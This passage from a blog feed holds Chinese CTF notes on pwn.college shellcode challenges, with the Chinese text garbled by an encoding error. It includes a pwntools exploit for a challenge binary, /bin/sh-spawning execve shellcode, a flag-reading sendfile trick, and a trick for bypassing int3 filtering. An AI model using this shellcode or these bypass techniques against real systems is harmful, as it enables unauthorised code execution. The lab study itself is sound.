class="hljs-number">000000000000183</span>C                 leave<br>.text:<span class="hljs-number">000000000000183</span>D                 retn<br></code></pre></td></tr></table></figure><p>å¯çŸ¥ï¼š</p><ul><li>shellcode çš„åœ°å€æ˜¯åœ¨ rdx ä¸­</li><li>rax ä¸º 0</li></ul><p> æ€è·¯ï¼š</p><ul><li>è§¦å‘ <code>read(int fildes, void *buf, size_t nbyte);</code> <ul><li><code>read(stdin,shellcode,nbytes)</code><ul><li>rdi:0</li><li>rsi:shellcode</li><li>rdx:nbytes</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level14&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    push rdx</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Assemble the shellcode</span><br>shellcode = asm(shellcode)<br><span class="hljs-comment">#print(shellcode)</span><br><span class="hljs-comment">#print(&quot;\n\nlength of code is \n\n&quot;,len(shellcode))</span><br><br>p.send(shellcode)<br><br>shellcode =asm( <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov sil, 0x4</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+shellcode<br><br>p.send(payload)<br><br><span class="hljs-comment"># Interact with the process</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>pathname æŒ‡å‘è¦æ‰§è¡Œçš„ç¨‹åºè·¯å¾„ã€‚<br>argv æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼ŒåŒ…å«è¦ä¼ é€’ç»™ç¨‹åºçš„æ‰€æœ‰å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°é€šå¸¸æ˜¯ç¨‹åºåã€‚<br>envp æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„ï¼Œæ­¤å¤„å¯ä»¥ä¸º NULLã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">char</span> *env[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm"><br>section .text<br>    global _start<br><br>_start:<br>    ; /bin/sh å­—ç¬¦ä¸²<br>    mov rax, &#x27;/bin//sh&#x27;    ; //bin/sh å­—ç¬¦ä¸²ï¼ˆ8 å­—èŠ‚åè½¬ï¼‰<br>    push rax<br><br>    ; æ„é€ å‚æ•°æ•°ç»„<br>    mov rdi, rsp           ; ç¬¬ä¸€ä¸ªå‚æ•°ï¼šç¨‹åºå (/bin/sh)<br>    push rdi               ; å‚æ•°æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´  (æŒ‡å‘ /bin/sh)<br>    mov rax, 0x702d        ; -p å­—ç¬¦ä¸² (åè½¬ï¼Œä½†åªæœ‰ä¸¤å­—èŠ‚)<br>    push rax               ; å‚æ•°æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´  (-p)<br>    mov rsi, rsp           ; ç¬¬äºŒä¸ªå‚æ•°ï¼šæŒ‡å‘å‚æ•°æ•°ç»„<br><br>    push 0                 ; å‚æ•°æ•°ç»„çš„ç»“æŸæ ‡å¿— NULL<br>    mov rdx, rsp           ; ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šç¯å¢ƒå˜é‡æ•°ç»„ (NULL)<br><br>    ; è°ƒç”¨ execve ç³»ç»Ÿè°ƒç”¨<br>    mov rax, 59            ; execve çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 59<br>    syscall                ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨<br><br>    ; é€€å‡ºç¨‹åº<br>    mov rax, 60            ; exit çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 60<br>    xor rdi, rdi           ; é€€å‡ºç  0<br>    syscall                ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨<br><br></code></pre></td></tr></table></figure><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><h2 id="å°ç«¯åº"><a href="#å°ç«¯åº" class="headerlink" title="å°ç«¯åº"></a>å°ç«¯åº</h2><p>æ ¹æ®å°ç«¯åºï¼Œ</p><p>mov  ebx, â€œxyz#â€</p><p>shl  ebx, 8 </p><p>shr  ebx, 8çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>å¦‚æœæ˜¯push â€œxyz#â€çš„è¯ï¼Œx åœ¨æœ€ä½ä½ï¼Œ#åœ¨æœ€é«˜ä½ï¼ˆåœ°å€ï¼‰</p><p>mov  ebx, â€œxyz#â€ç›¸å½“äºæŠŠâ€xyz#â€æ”¾åˆ°å†…å­˜ï¼Œç„¶å mov æŒ‡ä»¤å°†å†…å­˜æ‹·è´åˆ°å¯„å­˜å™¨ï¼Œå› æ­¤#æ˜¯æœ€é«˜åœ°å€</p><p><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F">https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F</a></p><ul><li>æ³¨æ„åˆ°pushçš„æ“ä½œæ•°åªèƒ½æ˜¯32ä½/64æ•°</li></ul><h1 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h1><p>å¾—åˆ°ä¸€ä¸ªshellï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>):<br>mov rax, <span class="hljs-number">59</span><span class="hljs-comment"># this is the syscall number of execve</span><br>lea rdi, [rip+binsh]<span class="hljs-comment"># points the first argument of execve at the /bin/sh string below</span><br>mov rsi, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the second argument, argv, NULL</span><br>mov rdx, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the third argument, envp, NULL</span><br>syscall<span class="hljs-comment"># this triggers the system call</span><br>binsh:<span class="hljs-comment"># a label marking where the /bin/sh string is</span><br>.<span class="hljs-keyword">string</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„<code>[rip+binsh]</code>, binshæ˜¯ç›¸å¯¹äºç›´è¡Œé“ç¬¬ä¸‰è¡Œçš„ripçš„åç§»</p><p>ä»£ç ä¸­æ··å…¥æ•°æ®çš„æ–¹æ³•ï¼š</p><ul><li>.byte 0x48, 0x45, 0x4C, 0x4C, 0x4FÂ  # â€œHELLOâ€Â </li><li>.string â€œHELLOâ€Â  # <code>&quot;HELLO\0&quot;</code></li></ul><p>æˆ–è€…æ˜¯æŠŠæŒ‡å‘æ•°æ®çš„æŒ‡é’ˆå‹æ ˆ</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x0068732f6e69622f</span>Â  # move <span class="hljs-string">&quot;/bin/sh\0&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rbx</span><br><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span>Â  # <span class="hljs-keyword">push</span> <span class="hljs-string">&quot;/bin/sh\0&quot;</span> onto the stack<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>Â  # point <span class="hljs-built_in">rdi</span> <span class="hljs-meta">at</span> the stack<br></code></pre></td></tr></table></figure><p>shellcode çš„åˆ«çš„ç”¨æ³•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sendfile</span>(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, NULL), <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)//`sendfile`Â æ˜¯ä¸€ä¸ªç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç›´æ¥ä¼ è¾“æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨,å°†æ–‡ä»¶æè¿°ç¬¦ <span class="hljs-number">1</span>ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ä½œä¸ºç›®æ ‡æ–‡ä»¶æè¿°ç¬¦ï¼Œ`open(<span class="hljs-string">&quot;/flag&quot;</span>, NULL)`Â è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ä½œä¸ºæºæ–‡ä»¶æè¿°ç¬¦<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å®Œæ•´çš„æ±‡ç¼–è¯­è¨€ç¼–å†™</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>.intel_syntax <span class="hljs-keyword">noprefix</span><br><span class="hljs-keyword"></span>mov rax, <span class="hljs-number">59</span><span class="hljs-comment"># this is the syscall number of execve</span><br>lea rdi, [rip+<span class="hljs-keyword">binsh]</span><span class="hljs-comment"># points the first argument of execve at the /bin/sh string below</span><br>mov rsi, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the second argument, argv, NULL</span><br>mov rdx, <span class="hljs-number">0</span><span class="hljs-comment"># this makes the third argument, envp, NULL</span><br><span class="hljs-keyword">syscall</span><span class="hljs-comment"># this triggers the system call</span><br><span class="hljs-keyword">binsh:</span><span class="hljs-comment"># a label marking where the /bin/sh string is</span><br>.string <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢è¯¥åŠ è½½å™¨ä½¿ç”¨äº†<code>mmap</code>å‡½æ•°æ¥åˆ†é…ä¸€å—å†…å­˜é¡µï¼Œç„¶åä½¿ç”¨<code>read</code>å‡½æ•°ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–shellcodeçš„å†…å®¹ï¼Œå¹¶å°†å…¶å†™å…¥åˆ†é…çš„å†…å­˜é¡µä¸­ã€‚æœ€åï¼Œé€šè¿‡å°†å†…å­˜é¡µè½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å®ƒï¼Œæ‰§è¡ŒåŠ è½½çš„shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä½¿ç”¨mmapå‡½æ•°åˆ†é…ä¸€å—å†…å­˜é¡µï¼Œèµ·å§‹åœ°å€ä¸º0x1337000ï¼Œå¤§å°ä¸º0x1000å­—èŠ‚ï¼ˆ4KBï¼‰</span><br>page = mmap(<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// ä½¿ç”¨readå‡½æ•°ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–shellcodeçš„å†…å®¹ï¼Œå¹¶å°†å…¶å†™å…¥åˆ†é…çš„å†…å­˜é¡µä¸­</span><br>read(<span class="hljs-number">0</span>, page, <span class="hljs-number">0x1000</span>);<br><br><span class="hljs-comment">// å°†å†…å­˜é¡µçš„åœ°å€è½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆï¼Œå¹¶è°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆï¼Œæ‰§è¡ŒåŠ è½½çš„shellcode</span><br>((<span class="hljs-keyword">void</span>(*)())page)();<br><br></code></pre></td></tr></table></figure><p><strong>è°ƒè¯•shellcode</strong></p><ul><li>strace ./shellcode-elf</li><li>gdb ./shellcode-elf</li><li><code>x/5i $rip</code>ï¼šæ‰“å°å½“å‰æŒ‡ä»¤åœ°å€Â <code>$rip</code>Â å¼€å§‹çš„ä¸‹5æ¡æŒ‡ä»¤çš„æ±‡ç¼–ä»£ç ã€‚</li><li><code>x/gx $rsp</code>ï¼šä»¥qwordï¼ˆ8å­—èŠ‚ï¼‰ä¸ºå•ä½æŸ¥çœ‹æ ˆæŒ‡é’ˆÂ <code>$rsp</code>Â æŒ‡å‘çš„å†…å­˜å†…å®¹ã€‚</li><li><code>x/2dx $rsp</code>ï¼šä»¥dwordï¼ˆ4å­—èŠ‚ï¼‰ä¸ºå•ä½æŸ¥çœ‹æ ˆæŒ‡é’ˆÂ <code>$rsp</code>Â æŒ‡å‘çš„å†…å­˜å†…å®¹ã€‚</li><li><code>x/4hx $rsp</code>ï¼šä»¥halfwordï¼ˆ2å­—èŠ‚ï¼‰ä¸ºå•ä½æŸ¥çœ‹æ ˆæŒ‡é’ˆÂ <code>$rsp</code>Â æŒ‡å‘çš„å†…å­˜å†…å®¹ã€‚</li><li><code>x/8b $rsp</code>ï¼šä»¥byteï¼ˆ1å­—èŠ‚ï¼‰ä¸ºå•ä½æŸ¥çœ‹æ ˆæŒ‡é’ˆÂ <code>$rsp</code>Â æŒ‡å‘çš„å†…å­˜å†…å®¹ã€‚</li><li><code>si</code>ï¼šå•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æœé‡åˆ°Â <code>call</code>Â æŒ‡ä»¤ï¼Œä¼šè¿›å…¥è¢«è°ƒç”¨å‡½æ•°å†…éƒ¨ã€‚</li><li><code>ni</code>ï¼šå•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æœé‡åˆ°Â <code>call</code>Â æŒ‡ä»¤ï¼Œä¼šè·³è¿‡è¢«è°ƒç”¨å‡½æ•°ï¼Œç›´æ¥æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li><li><code>break *0x400000</code>ï¼šåœ¨åœ°å€Â <code>0x400000</code>Â å¤„è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚</li><li><code>run</code>Â æˆ–Â <code>continue</code>ï¼šè¿è¡Œç¨‹åºï¼Œç›´åˆ°é‡åˆ°æ–­ç‚¹æˆ–ç¨‹åºç»“æŸã€‚</li><li><code>reverse execution</code>ï¼šåå‘æ‰§è¡Œç¨‹åºï¼Œå¯ä»¥å›æº¯åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚</li></ul><p>åœ¨AMD64æ¶æ„çš„shellcodeä¸­ï¼Œå­—æ¯â€Hâ€æ¯”å…¶ä»–å­—æ¯æ›´åŠ æ˜¾çœ¼çš„åŸå› æ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‰ç¼€å­—èŠ‚ã€‚AMD64æ¶æ„æ—¨åœ¨ä¸x86æ¶æ„ä¿æŒå‘åå…¼å®¹ï¼Œä»¥ä¾¿èƒ½å¤Ÿåœ¨å®è·µä¸­çœŸæ­£è¢«é‡‡ç”¨ã€‚åœ¨AMD64å¤„ç†å™¨ä¸Šæ‰§è¡Œçš„x86ä»£ç å°†å®Œå…¨åƒåœ¨x86å¤„ç†å™¨ä¸Šæ‰§è¡Œä¸€æ ·ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼ŒAMD64æ¶æ„æ˜¯ä¸€ä¸ªçº¯ç²¹çš„æ‰©å±•ï¼Œç”±ä¸€ä¸ªå‰ç¼€å­—èŠ‚â€Hâ€æ¥æ§åˆ¶ã€‚</p><p>ç„¶è€Œï¼Œæœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œå³åœ¨AMD64æ¶æ„ä¸­ï¼Œpushå’ŒpopæŒ‡ä»¤å¯ä»¥ç›´æ¥æ“ä½œ64ä½å€¼ï¼ˆå¦‚raxç­‰ï¼‰ï¼Œè€Œæ— éœ€å‰ç¼€å­—èŠ‚ã€‚</p><p>int 3 <strong>å¯¹åº”çš„æ˜¯0xCC</strong><br>ä½†æ˜¯ä¸‹é¢çš„æ–¹æ³•å¯ä»¥ç»•è¿‡ï¼š</p><ul><li><code>inc BYTE PTR [rip]</code></li><li>.byte 0xcb ;åŠ ä¸€å°±æ˜¯CC<br>å‰ææ˜¯éœ€è¦ç¡®ä¿textæ®µå¯å†™</li></ul><p><strong>x86å’Œamd64çš„ç³»ç»Ÿè°ƒç”¨å¼‚åŒ</strong>ï¼š</p><ul><li>int 0x80</li><li>syscall</li></ul><p><strong>å†…å­˜è®¿é—®çš„ä½æ•°å¤§å°</strong>ï¼š</p><table><thead><tr><th>single byte:</th><th>mov [rax], bl</th></tr></thead><tbody><tr><td>2-byte word:</td><td>mov [rax], bx</td></tr><tr><td>4-byte dword:</td><td>mov [rax], ebx</td></tr><tr><td>8-byte qword:</td><td>mov [rax], rbx</td></tr></tbody></table><p>æœ‰æ—¶éœ€è¦ç‰¹åˆ«æ ‡æ³¨å¤§å°</p><table><thead><tr><th>single byte</th><th>mov BYTE PTR [rax], 5</th></tr></thead><tbody><tr><td>2-byte word:</td><td>mov WORD PTR [rax], 5</td></tr><tr><td>4-byte dword:</td><td>mov DWORD PTR [rax], 5</td></tr><tr><td>8-byte qword:</td><td>mov QWORD PTR [rax], 5</td></tr></tbody></table><p><strong>ä¸åŒæ¶æ„çš„shellcode</strong></p><ol><li>åœ¨amd64æ¶æ„ä¸Šç¼–è¯‘å’Œè¿è¡Œshellcodeï¼š<ul><li>ç¼–è¯‘å‘½ä»¤ï¼š<code>gcc -nostdlib -static shellcode.s -o shellcode-elf</code></li><li>è¿è¡Œå‘½ä»¤ï¼š<code>./shellcode</code></li></ul></li><li>åœ¨mipsæ¶æ„ä¸Šç¼–è¯‘å’Œè¿è¡Œshellcodeï¼š<ul><li>ç¼–è¯‘å‘½ä»¤ï¼š<code>mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf</code></li><li>è¿è¡Œå‘½ä»¤ï¼š<code>qemu-mips-static ./shellcode-mips</code></li></ul></li></ol><p>å¯¹äºqemuæ¨¡æ‹Ÿå™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€äº›æœ‰ç”¨çš„é€‰é¡¹æ¥è°ƒè¯•å’Œè·Ÿè¸ªç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li><code>-strace</code>ï¼šæ‰“å°ç³»ç»Ÿè°ƒç”¨çš„æ—¥å¿—ï¼Œç±»ä¼¼äºstraceå·¥å…·çš„åŠŸèƒ½ã€‚</li><li><code>-g 1234</code>ï¼šåœ¨ç«¯å£1234ä¸Šç­‰å¾…gdbè¿æ¥ã€‚åœ¨gdb-multiarchä¸­ä½¿ç”¨<code>target remote localhost:1234</code>å‘½ä»¤è¿æ¥åˆ°æ¨¡æ‹Ÿå™¨è¿›è¡Œè°ƒè¯•ã€‚</li></ul><p><strong>ä¸€ä¸ªç¤ºä¾‹çš„å¤šæ¶æ„shellcodeçš„è®¾è®¡æ€è·¯</strong>ï¼š</p><ol><li>å°†eaxå¯„å­˜å™¨çš„å€¼å‹å…¥æ ˆä¸­ï¼ˆåœ¨x86å’Œamd64ä¸Šå…·æœ‰ç›¸åŒçš„æ“ä½œç ï¼‰ã€‚</li><li>æ£€æŸ¥espå¯„å­˜å™¨å‘å·¦ç§»åŠ¨32ä½æˆ–64ä½åçš„å€¼ï¼ˆåœ¨x86å’Œamd64ä¸Šå…·æœ‰ç›¸åŒçš„æ“ä½œç ï¼‰ã€‚</li><li>å¦‚æœç§»åŠ¨åçš„å€¼ä¸º32ä½ï¼Œè·³è½¬åˆ°32ä½shellcodeï¼›å¦‚æœä¸º64ä½ï¼Œè·³è½¬åˆ°64ä½shellcodeã€‚</li></ol><p>è¿™ç§ç­–ç•¥åˆ©ç”¨äº†x86å’Œamd64æ¶æ„ä¸­ä¸€äº›æŒ‡ä»¤çš„ç›¸ä¼¼æ€§ï¼Œä½¿å¾—å¯ä»¥åœ¨ä¸åŒçš„æ¶æ„ä¸Šæ‰§è¡Œç›¸åº”çš„shellcodeã€‚</p><p><strong>ç°ä»£æ¶æ„æ”¯æŒå†…å­˜æƒé™æ§åˆ¶</strong>ï¼š</p><ul><li>PROT_READ å…è®¸è¿›ç¨‹è¯»å–å†…å­˜</li><li>PROT_WRITE å…è®¸è¿›ç¨‹å†™å…¥å†…å­˜</li><li>PROT_EXEC å…è®¸è¿›ç¨‹æ‰§è¡Œå†…å­˜</li></ul><p>æ‰€ä»¥æ¸¸æˆç»“æŸäº†å—ï¼Ÿ</p><p><strong>ä½¿ç”¨mprotect()ç³»ç»Ÿè°ƒç”¨å¯ä»¥å°†å†…å­˜è®¾ç½®ä¸ºå¯æ‰§è¡Œï¼š</strong>  </p><ul><li>æ¬ºéª—ç¨‹åºè°ƒç”¨mprotect(PROT_EXEC)æ¥æ‰§è¡Œæˆ‘ä»¬çš„shellcode<ul><li>æœ€å¸¸è§çš„æ–¹æ³•æ˜¯é€šè¿‡è¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆReturn Oriented Programmingï¼‰è¿›è¡Œä»£ç é‡ç”¨</li></ul></li><li>è·³è½¬åˆ°shellcode</li></ul><p><strong>å³æ—¶ç¼–è¯‘ï¼ˆJust in Time Compilationï¼‰</strong> </p><ul><li>å³æ—¶ç¼–è¯‘å™¨éœ€è¦ç”Ÿæˆï¼ˆå¹¶ç»å¸¸é‡æ–°ç”Ÿæˆï¼‰è¦æ‰§è¡Œçš„ä»£ç ã€‚  </li><li>ç”¨äºä»£ç ç”Ÿæˆçš„é¡µé¢å¿…é¡»æ˜¯å¯å†™çš„ã€‚  </li><li>ç”¨äºæ‰§è¡Œçš„é¡µé¢å¿…é¡»æ˜¯å¯æ‰§è¡Œçš„ã€‚  </li><li>ç”¨äºä»£ç é‡æ–°ç”Ÿæˆçš„é¡µé¢å¿…é¡»æ˜¯å¯å†™çš„ã€‚</li></ul><p>The safe thing to do would be to:</p><ul><li>mmap(PROT_READ|PROT_WRITE)<ul><li>åˆ†é…å¯è¯»å¯å†™</li><li>write the code</li></ul></li><li>mprotect(PROT_READ|PROT_EXEC)<ul><li>execute</li></ul></li><li>mprotect(PROT_READ|PROT_WRITE)<ul><li>update code</li></ul></li><li>etcâ€¦</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼šprogram interaction</title>
    <link href="/p/a6c34954/"/>
    <url>/p/a6c34954/</url>
    
    <content type="html"><![CDATA[<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‰å‡ é¢˜éƒ½æ¯”è¾ƒç®€å•ï¼Œ</p><ul><li>çˆ¶å­è¿›ç¨‹é€šä¿¡ï¼ˆforkã€execveç­‰å‡½æ•°ï¼‰</li><li>ä¿¡å·æœºåˆ¶</li><li>ç®¡é“æœºåˆ¶</li><li>Cè¯­è¨€ã€shellè„šæœ¬ã€pythonè¯­è¨€å¤„ç†åŒ…æ‹¬ä¸Šé¢ä¸»é¢˜çš„è¾“å…¥è¾“å‡ºé—®é¢˜</li></ul><h1 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h1><p>æ¥è‡ªslides</p><p>è®²è¿°äº†ï¼š</p><ul><li>elf section header</li><li>è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼ˆforkï¼‰</li><li>æ‰§è¡Œè¿‡ç¨‹ï¼ˆåŠ è½½ï¼‰</li><li>è¿›ç¨‹çš„å†…å­˜å¸ƒå±€</li><li>ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰</li><li>ä¿¡å·ï¼ˆsignalsï¼‰</li></ul><p>further reading</p><ul><li><a href="https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/">Executable and Linkable Format 101. Part 2: Symbols</a></li><li><a href="https://www.rozmichelle.com/pipes-forks-dups/">Pipes, Forks, &amp; Dups: Understanding Command Execution and Input/Output Data Flow | rozmichelle</a></li><li><a href="https://www.binarytides.com/socket-programming-c-linux-tutorial/">Socket programming in C on Linux - The Ultimate Guide for Beginners - BinaryTides</a></li><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How the Linux kernel runs a program Â· Linux Inside</a></li></ul><h1 id="èµ·æ‰‹å¼"><a href="#èµ·æ‰‹å¼" class="headerlink" title="èµ·æ‰‹å¼"></a>èµ·æ‰‹å¼</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$</span><span class="hljs-variable">$</span> <span class="hljs-comment"># æ£€æµ‹çˆ¶è¿›ç¨‹</span><br><br>/chellenge/emxxx<br></code></pre></td></tr></table></figure><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>è¦æ±‚ embryoio_level1 çš„çˆ¶è¿›ç¨‹æ˜¯bash</p><p>ç›´æ¥è¿è¡Œç¨‹åºå³å¯</p><h1 id="2"><a href="#2" class="headerlink" 